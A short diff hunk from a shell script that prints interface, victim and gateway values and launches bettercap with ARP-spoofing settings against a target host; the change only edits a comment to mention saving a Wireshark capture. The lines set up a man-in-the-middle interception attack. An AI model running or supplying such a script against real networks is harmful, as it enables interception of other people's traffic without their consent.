@@ -11,7 +11,7 @@ echo "    Interface: $iface"
 echo "    Victim:     $victim"
 echo "    Gateway:     $router"
 
-#Launch bettercap against target 
+#Launch bettercap against target & create wireshark file in current directory
 sudo bettercap -iface "$iface" <<EOF
 set arp.spoof.targets $victim
 set arp.spoof.gateway $router
